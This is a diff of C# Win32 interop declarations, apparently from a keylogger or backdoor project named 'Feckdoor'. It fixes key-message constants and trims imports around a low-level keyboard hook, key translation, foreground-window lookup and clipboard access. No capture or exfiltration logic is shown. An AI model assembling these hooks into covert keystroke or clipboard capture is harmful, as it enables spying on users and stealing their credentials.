@@ -7,7 +7,9 @@ namespace Feckdoor
 	{
 		// Constants
 		public const int WM_KEYDOWN = 0x0100;
-		public const int WM_SYSKEYDOWN = 0x0105;
+		public const int WM_KEYUP = 0x0101;
+		public const int WM_SYSKEYDOWN = 0x0104;
+		public const int WM_SYSKEYUP = 0x0105;
 		public const int WH_KEYBOARD_LL = 13;
 		public const int CF_UNICODETEXT = 13;
 		public static IntPtr _hookID = IntPtr.Zero;
@@ -43,10 +45,8 @@ namespace Feckdoor
 			UP = 1 << 7
 		}
 
-		// Keyboard-related exports
-
-		[DllImport("user32.dll")]
-		public static extern short GetAsyncKeyState(Int32 vkey);
+		// [DllImport("user32.dll")]
+		// public static extern short GetAsyncKeyState(Int32 vkey);
 
 
 		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
@@ -62,10 +62,8 @@ namespace Feckdoor
 		[DllImport("user32.dll")]
 		public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
 
-		[DllImport("user32.dll")]
-		public static extern uint MapVirtualKey(uint uCode, uint uMapType);
-
-		// Window hook related exports
+		// [DllImport("user32.dll")]
+		// public static extern uint MapVirtualKey(uint uCode, uint uMapType);
 
 		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 		public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -77,21 +75,12 @@ namespace Feckdoor
 		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, ref KBDLLHOOKSTRUCT lParam);
 
-		// Window-related exports
-
-		[DllImport("user32.dll")]
-		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
 		[DllImport("user32.dll")]
 		public static extern IntPtr GetForegroundWindow();
-
-		[DllImport("user32.dll")]
-		public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
 		[DllImport("user32.dll", SetLastError = true)]
 		public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
-		// Clipboard-related exports
 		[DllImport("user32.dll", SetLastError = true)]
 		[return: MarshalAs(UnmanagedType.Bool)]
 		public static extern bool OpenClipboard([In, Optional] IntPtr hWnd);
